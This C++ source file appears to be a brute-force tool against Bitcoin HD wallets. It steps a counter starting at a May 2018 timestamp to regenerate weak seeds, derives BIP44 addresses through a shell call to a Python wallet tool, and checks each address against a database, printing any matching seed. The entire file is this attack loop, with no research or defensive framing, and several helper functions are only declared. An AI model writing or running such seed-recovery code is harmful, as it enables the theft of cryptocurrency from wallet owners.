#include <base58.h>
#include <crypto/hmac_sha512.h>
#include <openssl/ripemd.h>
#include <openssl/sha.h>
#include <db.h>

#include <iostream>

#include <unistd.h>
#include <string.h>
#include <vector>
#include <cstdio>

void get_hex_seed(size_t bitlen, uint32_t incr, char *data);

static void return_as_vector(std::string& in, std::vector<std::string>& out)
{
	const std::string delimiter = ",";
	size_t pos = 0;
	std::string token;
	while ((pos = in.find(delimiter)) != std::string::npos) {
	    token = in.substr(0, pos);
	    out.push_back(token);
	    in.erase(0, pos + delimiter.length());
	}
        out.push_back(in);
}

int main()
{
	auto redis = Redis("tcp://127.0.0.1:6379");

        initdb();

        int bitlen = 256;
        uint32_t incr = 1526711362;
        char seed[32];
        char hexseed[64+1];
        std::vector<std::string> split;
        memset(hexseed, 0, sizeof(hexseed));

        while (true) {
            printf("\r%08x", incr);

            get_hex_seed(bitlen, incr++, seed);
            for (int i=0; i<32; i++) {
                sprintf(hexseed+(i*2), "%02hhx", seed[i]);
            }

            std::string pylaunch = "cd /root/btc-hd-wallet && python3 btc_hd_wallet/__main__.py from-entropy-hex " + std::string(hexseed);
            system(pylaunch.c_str());

            auto value = redis.get("bip44");
            std::string strvalue = *value;

            split.clear();
            return_as_vector(strvalue, split);
            for (int i=0; i<split.size(); i++) {
                if (exists_in_db(split[i])) {
                    printf("found %s in seed %s\n", split[i].c_str(), hexseed);
                } 
            }
           
        }


	return 1;
}

